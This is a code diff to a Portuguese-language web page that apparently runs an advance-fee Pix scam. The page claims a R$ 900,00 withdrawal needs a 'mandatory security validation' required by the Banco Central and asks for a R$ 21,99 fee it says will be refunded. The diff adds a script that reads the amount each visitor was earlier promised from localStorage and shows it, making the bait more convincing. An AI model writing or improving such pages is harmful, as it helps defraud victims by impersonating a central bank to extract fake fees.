@@ -39,7 +39,7 @@ window.pixelId = "6a9dc2520f647cd31a8e712b";
 
 <main class="wrap hidden" id="fase3" style="padding-top:44px">
   <h1>Validação de Segurança</h1>
-  <p class="sub">Seu saque de <b>R$ 900,00</b> requer uma verificação obrigatória</p>
+  <p class="sub">Seu saque de <b id="saqueValor">R$ 900,00</b> requer uma verificação obrigatória</p>
   <div class="alert">
     <div class="alert-t">⚠️ Medida de Segurança Obrigatória</div>
     <p>O <b>Banco Central</b> exige uma validação antifraude. A taxa de <b>R$ 21,99</b> será reembolsada automaticamente.</p>
@@ -71,4 +71,15 @@ var t=setInterval(function(){
 </script>
 <script src="js/pix.js"></script>
 
+<script>
+(function(){
+  try{
+    var v = localStorage.getItem('creditoSolicitado') || localStorage.getItem('creditoAprovado');
+    if(v){
+      var el = document.getElementById('saqueValor');
+      if(el) el.textContent = 'R$ ' + v;
+    }
+  }catch(e){}
+})();
+</script>
 </body></html>
